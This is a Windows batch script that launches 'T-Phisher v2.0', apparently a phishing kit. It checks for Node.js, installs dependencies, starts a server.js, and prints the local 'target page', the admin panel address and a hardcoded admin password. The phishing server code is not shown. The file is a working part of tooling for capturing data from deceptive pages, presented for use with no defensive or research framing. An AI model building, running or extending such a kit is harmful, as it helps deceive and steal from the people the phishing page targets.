@echo off
title T-Phisher v2.0 ^| Admin Panel
color 0A

:: ════════════════════════════════════════════════════════
::   T-PHISHER v2.0 — Launcher
::   Target Page : http://localhost:3000
::   Admin Panel : http://localhost:3000/admin
:: ════════════════════════════════════════════════════════

echo.
echo  ╔══════════════════════════════════════════╗
echo  ║          T-PHISHER v2.0 LAUNCHER         ║
echo  ║   Telegram-Integrated Recon Framework    ║
echo  ╚══════════════════════════════════════════╝
echo.

:: Check if Node.js is available
where node >nul 2>&1
if %errorlevel% neq 0 (
    color 0C
    echo  [ERROR] Node.js not found in PATH.
    echo  Please install Node.js from https://nodejs.org
    echo.
    pause
    exit /b 1
)

:: Move into the scripts subfolder where server.js lives
cd /d "%~dp0scriptes"

:: Check if node_modules exists — if not, install dependencies first
if not exist "node_modules\" (
    echo  [*] node_modules not found. Installing dependencies...
    echo.
    npm install
    echo.
)

echo  [*] Starting T-Phisher server...
echo  [*] Target page  ^>  http://localhost:3000
echo  [*] Admin panel  ^>  http://localhost:3000/admin
echo  [*] Admin pass   ^>  admin123
echo.
echo  ──────────────────────────────────────────────────────
echo.

:: Launch the server
node server.js

:: Keep window open after server stops
echo.
echo  [!] Server stopped. Press any key to exit.
pause >nul